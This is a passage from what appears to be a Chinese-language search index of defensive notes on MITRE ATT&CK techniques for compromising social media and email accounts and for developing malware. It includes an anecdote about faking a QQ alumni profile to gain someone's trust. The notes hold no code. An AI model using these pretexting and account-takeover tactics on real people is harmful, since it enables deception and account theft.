d6\u4eec\u4ea7\u751f\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002 \u7834\u574f\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u901a\u8fc7\u9493\u9c7c\u7f51\u7ad9\u6536\u96c6\u4fe1\u606f\uff0c\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u8d2d\u4e70\u4fe1\u606f\uff0c\u6216\u8005\u901a\u8fc7\u66b4\u529b\u7834\u89e3\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u4ece\u6cc4\u9732\u7684\u4fe1\u606f\u8f6c\u50a8\u4e2d\u91cd\u590d\u4f7f\u7528\u5bc6\u7801\uff0c\u7b80\u5355\u7406\u89e3\uff1a\u5c31\u662f\u649e\u5e93\uff09\u5728\u76d7\u7528\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8fdb\u884c\u4fa6\u5bdf\uff0c\u4ee5\u51b3\u5b9a\u7834\u574f\u54ea\u4e9b\u8d26\u6237\u6765\u63a8\u8fdb\u5176\u884c\u52a8\u3002 \u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff08\u89d2\u8272\uff09\u53ef\u80fd\u5b58\u5728\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u6216\u591a\u4e2a\u7f51\u7ad9\u4e0a\uff08\u4f8b\u5982\uff1aFacebook\u3001LinkedIn\u3001Twitter\u7b49\uff09\u3002\u88ab\u5165\u4fb5\u7684\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u53ef\u80fd\u9700\u8981\u989d\u5916\u7684\u5f00\u53d1\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u586b\u5199\u6216\u4fee\u6539\u4e2a\u4eba\u8d44\u6599\u4fe1\u606f\uff0c\u8fdb\u4e00\u6b65\u5f00\u53d1\u793e\u4ea4\u7f51\u7edc\uff0c\u6216\u52a0\u5165\u7167\u7247\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u88ab\u76d7\u7528\u7684\u793e\u4ea4\u5a92\u4f53\u8d44\u6599\u521b\u5efa\u65b0\u7684\uff0c\u6216\u52ab\u6301\u73b0\u6709\u7684\uff0c\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u7684\u8054\u7cfb\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u80fd\u662f\u76f4\u63a5\u7684\uff0c\u4e5f\u53ef\u80fd\u5305\u62ec\u8bd5\u56fe\u901a\u8fc7\u4ed6\u4eba\u8fdb\u884c\u8fde\u63a5\u3002\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u53ef\u4ee5\u5229\u7528\u88ab\u76d7\u7528\u7684\u8d26\u6237\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_1","text":"\u7b80\u5355\u7406\u89e3\uff1a\u76d7\u7528\u4e00\u4e9b\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u6bd4\u5982xxx\u516c\u53f8\u7684\u8d22\u52a1\u4eba\u5458\uff0c\u7136\u540e\u901a\u8fc7\u8be5\u8d26\u6237\u548c\u5176\u4ed6\u5458\u5de5\u6c9f\u901a\u4ea4\u6d41\uff0c\u6216\u8005\u76f4\u63a5\u5229\u7528\u8be5\u8d26\u6237\u548c\u76ee\u6807\u8fdb\u884c\u6c9f\u901a\u3002\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u5b9a\u4f4d\u653b\u51fb\u4eba\u5458\u8eab\u4efd\u4fe1\u606f\uff0c\u901a\u8fc7QQ\u8054\u7cfb\uff0c\u5c06\u81ea\u5df1\u7684QQ\u4fe1\u606f\u66f4\u6539\u4e3a\u548c\u653b\u51fb\u4eba\u5458\u5177\u6709\u4e00\u5b9a\u7684\u76f8\u4f3c\u4e4b\u5904\uff08\u540c\u4e00\u6240\u5b66\u6821\u3001\u540c\u4e00\u4e2a\u4e13\u4e1a\u7b49\uff09\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u83b7\u53d6\u5230\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002\u8fd9\u662f\u6eaf\u6e90\u653b\u51fb\u4eba\u5458\u8eab\u4efd\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u662f\u653b\u51fb\u8005\u5bf9\u653b\u51fb\u76ee\u6807\u8fdb\u884c\u793e\u4f1a\u5de5\u7a0b\u884c\u52a8\u7684\u4e00\u90e8\u5206\u3002 \u5177\u4f53\u6848\u4f8b\u53ef\u53c2\u8003\uff1a \u8bb0\u4e00\u6b21\u8270\u96be\u7684\u6eaf\u6e90\u6545\u4e8b\uff08\u5bf9\u4e0d\u8d77\u5b66\u957f\uff09\uff1a https://xz.aliyun.com/t/9582 \u6709\u8fd9\u4e48\u4e00\u6bb5\u63cf\u8ff0\uff1a\u201d\u7528\u4e00\u4e2aqq\u7b49\u7ea7\u9ad8\u70b9\u7684\u5c0f\u53f7\uff0c\u4fee\u6539\u597d\u8d44\u6599\uff0c99\u5e74\uff0c18\u5c4a\uff0c\u67d0\u67d0\u9662\u6821\uff0c\u8ba1\u7b97\u673a\u4e13\u4e1a\uff0c\u7a7a\u95f4\u641e\u4e86\u4e9b\u5728\u8d34\u5427\u627e\u7684\u5b66\u6821\u7167\u7247\u3002\u5199\u4e0a18\u5c4a\u7684\u5b66\u5f1f\u60f3\u54a8\u8be2\u5c31\u4e1a\u4fe1\u606f\uff0c\u8ba2~\u597d\u53cb\u7533\u8bf7\u5df2\u53d1\u9001\u3002\u65e2\u7136\u662f\u505a\u68a6\uff0c\u80af\u5b9a\u662f\u534a\u591c\uff0c\u5e94\u8be5\u662f12\u70b9\u5de6\u53f3\u770b\u5230\u901a\u8fc7\u4e86\u8bf7\u6c42\uff0c\u4e5f\u5c31\u8fc7\u4e86\u5341\u6765\u5206\u949f\u5427\u3002\u6b63\u51c6\u5907\u53d1\u6784\u601d\u597d\u7684\u95ee\u5019\u5b66\u957f\u7684\u8bdd\u3002\u597d\u5bb6\u4f19\uff0c\u76f4\u63a5\u7ed9\u6211\u6765\u4e86\u4e00\u5927\u6ce2\u5185\u63a8\u3002\u8fd9\u91cc\u6697\u793a\u7684\u63d0\u4e86\u4e00\u4e0b\u81ea\u5df1\u662f\u505a\u5f00\u53d1\u7684\u4e0d\u662f\u7f51\u7edc\u5b89\u5168\u964d\u4f4e\u8b66\u60d5\u5fc3\u3002\u201c","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_8","text":"\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u7684\u7ec4\u7ec7\u6709\u5173\u7684\u793e\u4ea4\u5a92\u4f53\u6d3b\u52a8\u3002\u53ef\u7591\u7684\u6d3b\u52a8\u53ef\u80fd\u5305\u62ec\u58f0\u79f0\u4e3a\u60a8\u7684\u7ec4\u7ec7\u5de5\u4f5c\u7684\u89d2\u8272\uff0c\u6216\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u8d26\u6237\u5411\u4e0e\u60a8\u7684\u7ec4\u7ec7\u76f8\u5173\u7684\u8d26\u6237\u63d0\u51fa\u5927\u91cf\u8fde\u63a5\u8bf7\u6c42\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_9","text":"MITRE-ATT&CK-T1586-001 https://attack.mitre.org/techniques/T1586/001/ \u8bb0\u4e00\u6b21\u8270\u96be\u7684\u6eaf\u6e90\u6545\u4e8b\uff08\u5bf9\u4e0d\u8d77\u5b66\u957f\uff09 https://xz.aliyun.com/t/9582","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/","text":"T1586-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u7528\u53ef\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u88ab\u76d7\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5229\u7528\u5b83\u4eec\u6765\u8fdb\u884c\u4fe1\u606f\u9493\u9c7c\u6216\u7f51\u7edc\u9493\u9c7c\u3002\u5982\u679c\u6f5c\u5728\u7684\u53d7\u5bb3\u8005\u4e0e\u88ab\u653b\u51fb\u7684\u89d2\u8272\u6709\u5173\u7cfb\uff0c\u6216\u8005\u77e5\u9053\u88ab\u653b\u51fb\u7684\u89d2\u8272\uff0c\u90a3\u4e48\u5229\u7528\u73b0\u6709\u7684\u89d2\u8272\u4e0e\u88ab\u653b\u51fb\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u53ef\u80fd\u4f1a\u4f7f\u4ed6\u4eec\u4ea7\u751f\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002\u88ab\u5165\u4fb5\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e5f\u53ef\u7528\u4e8e\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u4f8b\u5982\uff1a\u57df\u540d\uff09\u3002 \u76d7\u53d6\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f8b\u5982\u901a\u8fc7\u9493\u9c7c\u7f51\u7ad9\u6536\u96c6\u4fe1\u606f\uff0c\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u8d2d\u4e70\u8bc1\u4e66\uff0c\u6216\u901a\u8fc7\u66b4\u529b\u7834\u89e3\uff08\u4f8b\u5982\uff1a\u4ece\u8fdd\u89c4\u51ed\u636e\u8f6c\u50a8\u4e2d\u91cd\u7528\u5bc6\u7801\uff0c\u7b80\u5355\u7406\u89e3\uff1a\u649e\u5e93\uff09\u3002\u5728\u76d7\u53d6\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8fdb\u884c\u4fa6\u5bdf\uff0c\u4ee5\u51b3\u5b9a\u7834\u574f\u54ea\u4e9b\u8d26\u6237\u6765\u63a8\u8fdb\u5176\u884c\u52a8\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u88ab\u5165\u4fb5\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\uff0c\u6765\u52ab\u6301\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u7684\u73b0\u6709\u7535\u5b50\u90ae\u4ef6\u7ebf\u7a0b\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5f88\u597d\u7406\u89e3\uff0c\u8fd9\u91cc\u4e0d\u505a\u4efb\u4f55\u6848\u4f8b\u8bf4\u660e\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1586-002 https://attack.mitre.org/techniques/T1586/002/","title":"T1586-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#t1586-002-","text":"","title":"T1586-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u7528\u53ef\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u88ab\u76d7\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5229\u7528\u5b83\u4eec\u6765\u8fdb\u884c\u4fe1\u606f\u9493\u9c7c\u6216\u7f51\u7edc\u9493\u9c7c\u3002\u5982\u679c\u6f5c\u5728\u7684\u53d7\u5bb3\u8005\u4e0e\u88ab\u653b\u51fb\u7684\u89d2\u8272\u6709\u5173\u7cfb\uff0c\u6216\u8005\u77e5\u9053\u88ab\u653b\u51fb\u7684\u89d2\u8272\uff0c\u90a3\u4e48\u5229\u7528\u73b0\u6709\u7684\u89d2\u8272\u4e0e\u88ab\u653b\u51fb\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u53ef\u80fd\u4f1a\u4f7f\u4ed6\u4eec\u4ea7\u751f\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002\u88ab\u5165\u4fb5\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e5f\u53ef\u7528\u4e8e\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u4f8b\u5982\uff1a\u57df\u540d\uff09\u3002 \u76d7\u53d6\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f8b\u5982\u901a\u8fc7\u9493\u9c7c\u7f51\u7ad9\u6536\u96c6\u4fe1\u606f\uff0c\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u8d2d\u4e70\u8bc1\u4e66\uff0c\u6216\u901a\u8fc7\u66b4\u529b\u7834\u89e3\uff08\u4f8b\u5982\uff1a\u4ece\u8fdd\u89c4\u51ed\u636e\u8f6c\u50a8\u4e2d\u91cd\u7528\u5bc6\u7801\uff0c\u7b80\u5355\u7406\u89e3\uff1a\u649e\u5e93\uff09\u3002\u5728\u76d7\u53d6\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8fdb\u884c\u4fa6\u5bdf\uff0c\u4ee5\u51b3\u5b9a\u7834\u574f\u54ea\u4e9b\u8d26\u6237\u6765\u63a8\u8fdb\u5176\u884c\u52a8\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u88ab\u5165\u4fb5\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\uff0c\u6765\u52ab\u6301\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u7684\u73b0\u6709\u7535\u5b50\u90ae\u4ef6\u7ebf\u7a0b\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_1","text":"\u5f88\u597d\u7406\u89e3\uff0c\u8fd9\u91cc\u4e0d\u505a\u4efb\u4f55\u6848\u4f8b\u8bf4\u660e\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_8","text":"\u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_9","text":"MITRE-ATT&CK-T1586-002 https://attack.mitre.org/techniques/T1586/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-001-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","text":"T1587-001-\u5f00\u53d1\u80fd\u529b-\u6076\u610f\u8f6f\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f00\u53d1\u6076\u610f\u8f6f\u4ef6\u548c\u6076\u610f\u8f6f\u4ef6\u7ec4\u4ef6\uff0c\u53ef\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6784\u5efa\u6076\u610f\u8f6f\u4ef6\u53ef\u4ee5\u5305\u62ec\u5f00\u53d1\u6709\u6548\u8f7d\u8377\u3001\u6295\u653e\u5668\u3001\u7834\u574f\u540e\u7684\u5de5\u5177\u3001\u540e\u95e8\uff08\u5305\u62ec\u540e\u95e8\u7a0b\u5e8f\uff09\u3001\u6253\u5305\u7a0b\u5e8f\u3001C2\u534f\u8bae\uff0c\u4ee5\u53ca\u521b\u5efa\u53d7\u611f\u67d3\u7684\u53ef\u79fb\u52a8\u5a92\u4f53\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f00\u53d1\u6076\u610f\u8f6f\u4ef6\u6765\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4ece\u800c\u521b\u5efa\u4e00\u79cd\u65b9\u6cd5\u6765\u4fdd\u6301\u5bf9\u8fdc\u7a0b\u673a\u5668\u7684\u63a7\u5236\u3001\u9003\u907f\u9632\u5fa1\u548c\u6267\u884c\u6743\u9650\u540e\u7684\u884c\u4e3a\u3002 \u3002 \u4e0e\u5408\u6cd5\u7684\u5f00\u53d1\u5de5\u4f5c\u4e00\u6837\uff0c\u5f00\u53d1\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u6280\u80fd\u7ec4\u5408\u3002\u6240\u9700\u7684\u6280\u80fd\u53ef\u80fd\u4f4d\u4e8e\u5185\u90e8\uff0c\u4e5f\u53ef\u80fd\u9700\u8981\u5916\u5305\u3002\u4f7f\u7528\u627f\u5305\u5546\u53ef\u88ab\u89c6\u4e3a\u8be5\u653b\u51fb\u8005\u7684\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u80fd\u529b\u7684\u5ef6\u4f38\uff0c\u524d\u63d0\u662f\u653b\u51fb\u8005\u5728\u5851\u9020\u9700\u6c42\u65b9\u9762\u53d1\u6325\u4f5c\u7528\u5e76\u4fdd\u6301\u5bf9\u6076\u610f\u8f6f\u4ef6\u7684\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6392\u4ed6\u6027\u3002 \u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u7684\u67d0\u4e9b\u65b9\u9762\uff0c\u5982C2\u534f\u8bae\u5f00\u53d1\uff0c\u53ef\u80fd\u9700\u8981\u653b\u51fb\u8005\u83b7\u5f97\u989d\u5916\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u4f8b\u5982\uff0c\u4e3a\u4e86C2\u4e0eTwitter\u901a\u4fe1\u800c\u5f00\u53d1\u7684\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u9700\u8981\u4f7f\u7528Web\u670d\u52a1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b 